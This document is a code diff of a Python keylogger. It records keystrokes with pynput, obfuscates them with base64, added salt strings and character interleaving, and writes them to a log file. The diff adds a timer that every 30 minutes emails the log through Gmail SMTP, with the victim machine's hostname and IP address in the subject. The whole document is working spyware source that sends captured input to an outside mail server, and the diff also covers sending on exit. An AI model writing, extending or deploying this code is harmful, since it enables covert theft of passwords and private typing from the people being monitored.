@@ -1,25 +1,41 @@
 from pynput.keyboard import Key, Listener
-from base64 import b64encode as b64
-from itertools import chain
-from Mail import MailSender
 from datetime import datetime
+from base64 import b64encode
+from Mail import MailSender
+from itertools import chain
+from threading import Event
 import logging
 import atexit
 import socket
+import Timer
 
 log_dir = ""
 keyStrokes = []
 
 logging.basicConfig(filename=(log_dir + "key_log.txt"),
-                    level=logging.DEBUG, format='%(message)s')
+                    level=logging.DEBUG, format='%(message)s', filemode='w')
 
 
-def Encode(string):
-    string = b64(string.encode())
+def main():
+    write_file()
+    send_email()
+
+
+stop = Event()
+timer = Timer.PerpetualTimer(
+    func=main,
+    time=30,
+    time_unit="mins",
+    stop_event=stop)
+timer.start()
+
+
+def encode(string):
+    string = b64encode(string.encode())
     return string.decode('utf-8')
 
 
-def addSalts(string):
+def add_salts(string):
     salts = ["@@PoC", "ˆaDnIL(", "nSo@rsa2h"]
     size = len(string)
     for s in salts:
@@ -27,30 +43,30 @@ def addSalts(string):
     return salts[0] + string + salts[2] + salts[1]
 
 
-def Encrypt(string):
-    string = Encode(string)
-    string = addSalts(string)
+def encrypt(string):
+    string = encode(string)
+    string = add_salts(string)
     string = zip(string, string[::-1])
     string = chain(*string)
     string = list(string)
-    return Encode("".join(string))
+    return encode("".join(string))
 
 
-def WriteFile():
+def write_file():
     global keyStrokes
-    logging.info(Encrypt("".join(keyStrokes)))
+    logging.info(encrypt("".join(keyStrokes)))
     keyStrokes = []
     return
 
 
 def send_email():
-    sub = socket.gethostname() + " - IP: "
-    + socket.gethostbyname(socket.gethostname())
+    sub = socket.gethostname() + " - IP: " \
+        + socket.gethostbyname(socket.gethostname())
 
-    mail = MailSender("",
-                      "",
-                      "",
-                      "smtp.gmail.com:857",
+    mail = MailSender("your_email@gmail.com",
+                      "your_password",
+                      "your_email@gmail",
+                      "smtp.gmail.com:587",
                       "key_log.txt",
                       sub,
                       str(datetime.now())
@@ -60,8 +76,10 @@ def send_email():
 
 
 def exit_handler():
-    WriteFile()
+    write_file()
     send_email()
+    stop.set()
+    Listener.stop
 
 
 atexit.register(exit_handler)
